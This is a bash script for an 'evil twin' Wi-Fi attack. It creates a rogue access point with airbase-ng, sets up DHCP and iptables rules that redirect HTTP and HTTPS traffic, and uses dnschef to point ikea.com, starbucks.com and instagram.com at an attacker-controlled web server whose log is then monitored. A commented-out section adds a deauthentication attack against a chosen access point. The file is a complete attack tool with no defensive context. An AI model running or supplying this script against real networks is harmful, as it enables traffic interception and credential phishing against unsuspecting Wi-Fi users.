if [ "$#" != 3 ]; then
	echo "Usage: ./evil.sh <Evil AP Name> <specify interface wireless interface> <web server ip addr>"
else
	ap_name=$1
	int1=$2
	ip=$3
	# Remove previous process
	pkill -9 airbase
	iptables --flush
	pkill -9 dhcp
	
	# Turn interface to monitor mode
	ifconfig $int1 down 
	iwconfig $int1 mode monitor 
	ifconfig $int1 up 
	airmon-ng start $int1 
	sleep 5

	# Start evil ap
	gnome-terminal -- airbase-ng -e "$ap_name" -c 10 $int1
	sleep 5

	echo "Creating at0"
	# Setting up interface at0
	sudo ifconfig at0 192.168.10.1 netmask 255.255.255.0
	sudo ifconfig at0 mtu 1400
	sudo route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1
	ifconfig at0
	sleep 5


	echo "Creating ip table rules"
	# Setting up IP Table Rules
	sudo echo 1 > /proc/sys/net/ipv4/ip_forward
	sudo iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.10.1
	sudo iptables -P FORWARD ACCEPT
	sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
	sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80
	sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80

	echo "Creating DHCP Rules"
	FILE=$(pwd)/dhcpd.conf
	if test -f "$FILE"; then
		touch /var/lib/dhcp/dhcpd.leases
    	sudo dhcpd -cf dhcpd.conf -pf /var/run/dhcpd.pid at0 
	else
		exit 1

	fi
	

	# DNS Poisoning
	service apache2 start
	gnome-terminal -- sudo dnschef --interface 192.168.10.1 --fakeip $ip --fakedomain *.ikea.com,*.starbucks.com,*.instagram.com
	sleep 5
	# Monitor Log
	gnome-terminal -- tail -f /var/www/html/log.txt
	
fi


# if [[ $(echo $deauth | grep -P "Y|y") ]]; then 
# 	echo "Specify other wireless interface"
# 	read int2
# 	airmon-ng start $int2 > /dev/null
# 	echo "Specify BSSID of AP you want to deauth"
# 	xterm -hold -e airodump-ng "$int2"mon --band abg
# 	read bssid
# 	aireplay-ng -0 0 -a $bssid "$int2"mon

# else
# 	echo "no"
# fi
